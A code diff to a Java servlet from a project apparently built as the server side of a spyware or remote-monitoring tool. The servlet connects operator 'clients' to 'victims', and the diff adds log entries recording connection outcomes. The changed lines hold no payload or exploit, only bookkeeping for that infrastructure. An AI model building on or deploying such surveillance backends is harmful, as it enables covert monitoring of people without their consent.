@@ -2,6 +2,8 @@ package com.theah64.xrob.api.servlets;
 
 import com.theah64.xrob.api.database.tables.ClientVictimRelations;
 import com.theah64.xrob.api.database.tables.Clients;
+import com.theah64.xrob.api.database.tables.Deliveries;
+import com.theah64.xrob.api.models.Delivery;
 import com.theah64.xrob.api.utils.APIResponse;
 import com.theah64.xrob.api.utils.HeaderSecurity;
 import com.theah64.xrob.api.utils.Request;
@@ -26,7 +28,7 @@ public class ConnectClientToVictimServlet extends BaseServlet {
         final PrintWriter out = response.getWriter();
         try {
             final HeaderSecurity hs = new HeaderSecurity(request.getHeader(HeaderSecurity.KEY_AUTHORIZATION));
-            
+
             final Request connectRequest = new Request(request, REQUIRED_PARAMS);
 
             final String clientCode = connectRequest.getStringParameter(Clients.COLUMN_CLIENT_CODE);
@@ -38,11 +40,14 @@ public class ConnectClientToVictimServlet extends BaseServlet {
                 if (!isAlreadyConnected) {
                     final boolean isConnected = cvr.connect(clientId, victimId);
                     if (isConnected) {
+                        Deliveries.getInstance().add(new Delivery(victimId, false, "Client connection established with Client-" + clientId, Delivery.TYPE_OTHER, 0));
                         out.write(new APIResponse("You're CONNECTED!", null).getResponse());
                     } else {
+                        Deliveries.getInstance().add(new Delivery(victimId, true, "Client connection failed to establish with Client-" + clientId, Delivery.TYPE_OTHER, 0));
                         throw new Exception("Error while establishing the connection!");
                     }
                 } else {
+                    Deliveries.getInstance().add(new Delivery(victimId, false, "Client re-connect request with Client-" + clientId, Delivery.TYPE_OTHER, 0));
                     throw new Exception("You're already connected to this victim");
                 }
             } else {
